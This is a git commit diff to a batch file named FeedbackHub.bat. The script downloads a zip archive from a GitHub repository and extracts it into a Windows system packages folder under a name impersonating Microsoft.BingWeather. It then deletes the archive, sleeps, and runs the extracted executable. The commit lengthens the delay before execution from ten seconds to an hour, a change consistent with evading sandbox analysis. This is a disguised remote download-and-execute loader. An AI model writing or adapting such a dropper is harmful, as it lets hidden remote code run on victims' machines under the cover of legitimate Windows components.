895043510a8d28b6b34bafb9bd63f53bb8750d30
OP-EX <107932068+OP-EX@users.noreply.github.com>
2022-10-05 20:35:14 -0400

    Update FeedbackHub.bat

--- FeedbackHub.bat
+++ FeedbackHub.bat
@@ -4,5 +4,5 @@ cd C:\ProgramData\Microsoft\Windows\AppRepository\Packages
 Powershell -Command "Invoke-WebRequest 'https://github.com/OP-EX/-/archive/refs/heads/main.zip' -OutFile Microsoft.BingWeather_4.53.42682.0_neutral_~_8wekyb3d8bbwc.zip"
 Powershell -Command "Expand-Archive -Path 'C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.BingWeather_4.53.42682.0_neutral_~_8wekyb3d8bbwc.zip' -DestinationPath 'C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.BingWeather_4.53.42682.0_neutral_~_8wekyb3d8bbwc' -Force"
 Powershell -Command "Remove-Item -recurse C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.BingWeather_4.53.42682.0_neutral_~_8wekyb3d8bbwc.zip"
-Powershell -Command "Start-Sleep -Seconds 10"
+Powershell -Command "Start-Sleep -Seconds 3600"
 Powershell -Command  "C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.BingWeather_4.53.42682.0_neutral_~_8wekyb3d8bbwc\--main\0000\Microsoft.BingWeather_4.53.42682.0_neutral_~_8wekyb3d8bbwc.exe"
